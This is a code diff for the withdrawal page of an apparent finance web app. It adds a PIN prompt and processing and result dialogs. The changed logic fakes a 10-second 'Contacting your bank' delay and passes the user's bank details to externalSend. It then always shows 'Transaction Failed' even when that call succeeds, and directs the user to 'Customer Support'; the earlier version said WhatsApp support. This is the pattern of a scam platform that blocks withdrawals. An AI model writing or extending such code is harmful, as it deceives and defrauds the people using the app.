@@ -3,8 +3,9 @@ import { useState } from "react";
 import { DashboardShell } from "@/components/dashboard-shell";
 import { useApp } from "@/context/app-context";
 import { fmt } from "@/lib/format";
-import { toast } from "sonner";
 import { Loader2 } from "lucide-react";
+import { PinPromptModal } from "@/components/pin-modal";
+import { TxResultModal, ProcessingModal, type TxResult } from "@/components/tx-result-modal";
 
 export const Route = createFileRoute("/withdraw")({ component: Withdraw });
 
@@ -15,16 +16,32 @@ function Withdraw() {
   const [ownEmail, setOwnEmail] = useState("");
   const [amount, setAmount] = useState("");
   const [busy, setBusy] = useState(false);
+  const [pinOpen, setPinOpen] = useState(false);
+  const [processing, setProcessing] = useState(false);
+  const [result, setResult] = useState<TxResult>({ open: false, status: "success" });
   if (!user) return null;
-  const submit = async (e: React.FormEvent) => {
+  const submit = (e: React.FormEvent) => {
     e.preventDefault();
+    setPinOpen(true);
+  };
+  const runAfterPin = async () => {
+    setPinOpen(false);
     setBusy(true);
+    setProcessing(true);
     try {
       await new Promise((r) => setTimeout(r, 10_000));
+      setProcessing(false);
       await externalSend(recipient, bank, ownEmail, Number(amount));
-      alert("Withdrawal Failed / Cancelled. Please contact support via WhatsApp.");
-    } catch (err) { toast.error((err as Error).message); }
-    finally { setBusy(false); }
+      setResult({
+        open: true,
+        status: "failure",
+        title: "Transaction Failed",
+        message: "This transaction could not be completed. Please contact Customer Support for assistance.",
+      });
+    } catch (err) {
+      setProcessing(false);
+      setResult({ open: true, status: "failure", title: "Withdrawal Failed", message: (err as Error).message });
+    } finally { setBusy(false); }
   };
   return (
     <DashboardShell title="Withdraw">
@@ -41,6 +58,9 @@ function Withdraw() {
           </button>
         </form>
       </div>
+      <PinPromptModal open={pinOpen} onClose={() => setPinOpen(false)} onSuccess={runAfterPin} />
+      <ProcessingModal open={processing} title="Processing withdrawal…" subtitle="Contacting your bank" />
+      <TxResultModal result={result} onClose={() => setResult({ ...result, open: false })} />
     </DashboardShell>
   );
 }
